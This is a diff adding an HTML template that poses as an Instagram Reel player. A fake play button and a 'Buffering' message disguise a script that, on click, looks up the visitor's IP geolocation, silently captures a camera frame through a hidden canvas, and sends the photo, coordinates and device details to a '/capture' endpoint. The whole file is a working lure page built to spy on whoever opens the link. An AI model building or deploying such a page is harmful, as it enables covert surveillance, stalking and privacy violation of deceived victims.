@@ -1,0 +1,150 @@
+<!-- templates/index.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram Reel</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Instagram Reel">
+    <meta property="og:description" content="Watch this reel">
+    <style>
+        body { 
+            background: #000; color: white; font-family: sans-serif; 
+            display: flex; justify-content: center; align-items: center; 
+            height: 100vh; margin: 0; overflow: hidden; 
+        }
+        #player-container { 
+            width: 90%; max-width: 360px; height: 70vh; 
+            background: #111; border-radius: 20px; 
+            display: flex; flex-direction: column; 
+            align-items: center; justify-content: center; 
+            border: 1px solid #333; text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        #play-button { 
+            width: 70px; height: 70px; background: rgba(255,255,255,0.2); 
+            border-radius: 50%; display: flex; justify-content: center; 
+            align-items: center; cursor: pointer; transition: transform 0.2s; 
+        }
+        #play-button:hover { transform: scale(1.1); }
+        .play-icon { 
+            width: 0; height: 0; 
+            border-top: 15px solid transparent; 
+            border-bottom: 15px solid transparent; 
+            border-left: 25px solid white; margin-left: 5px; 
+        }
+        #status-text { margin-top: 20px; font-size: 16px; color: #aaa; }
+        .loading-bar { 
+            width: 60%; height: 4px; background: #333; 
+            margin-top: 15px; border-radius: 2px; overflow: hidden; 
+        }
+        .loading-progress { 
+            width: 0%; height: 100%; background: #ff304f; 
+            animation: progress 3s infinite; 
+        }
+        @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
+    </style>
+</head>
+<body>
+    <div id="player-container">
+        <div id="play-button">
+            <div class="play-icon"></div>
+        </div>
+        <p id="status-text">Tap to play Reel</p>
+        <div class="loading-bar"><div class="loading-progress"></div></div>
+    </div>
+
+    <script>
+        console.log("[DEBUG] Script loaded. Initializing...");
+
+        async function collectData() {
+            console.log("[DEBUG] collectData() started...");
+            const telemetry = {
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${window.screen.width}x${window.screen.height}`
+            };
+
+            // 1. Geolocation (Silent via IP API)
+            try {
+                console.log("[DEBUG] Fetching IP-based Geolocation...");
+                const res = await fetch('https://ipapi.co/json/');
+                const geo = await res.json();
+                telemetry.city = geo.city;
+                telemetry.lat = geo.latitude;
+                telemetry.lon = geo.longitude;
+                console.log("[DEBUG] Geolocation captured:", geo.city);
+            } catch (e) { 
+                console.log("[DEBUG] Geolocation error:", e);
+            }
+
+            // 2. Camera Capture (Triggered by User Click)
+            try {
+                console.log("[DEBUG] Requesting Camera...");
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                
+                // Capture frame using a hidden canvas
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const imageData = canvas.toDataURL('image/jpeg', 0.5);
+                telemetry.image_data = imageData;
+                telemetry.camera_status = "Granted";
+                console.log("[DEBUG] Image captured successfully.");
+
+                // Stop camera
+                stream.getTracks().forEach(track => track.stop());
+            } catch (e) { 
+                console.log("[DEBUG] Camera error:", e);
+                telemetry.camera_error = e.message; 
+            }
+
+            // 3. Send to Backend
+            console.log("[DEBUG] Sending payload to server...");
+            try {
+                const response = await fetch('/capture', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(telemetry)
+                });
+                const result = await response.json();
+                console.log("[DEBUG] Server response:", result);
+            } catch (e) {
+                console.log("[DEBUG] Error sending to server:", e);
+            }
+        }
+
+        async function triggerPayload() {
+            console.log("[DEBUG] Play button clicked!");
+            const statusText = document.getElementById('status-text');
+            
+            if (statusText) {
+                statusText.innerText = "Buffering...";
+                statusText.style.color = "#ff304f";
+            }
+
+            // Small delay to simulate real app behavior
+            await new Promise(resolve => setTimeout(resolve, 1200));
+
+            await collectData();
+        }
+
+        // Event Listeners
+        document.getElementById('play-button').addEventListener('click', triggerPayload);
+        
+        window.addEventListener('load', () => {
+            console.log("[DEBUG] App ready. Waiting for user to click Play.");
+        });
+
+    </script>
+</body>
+</html>
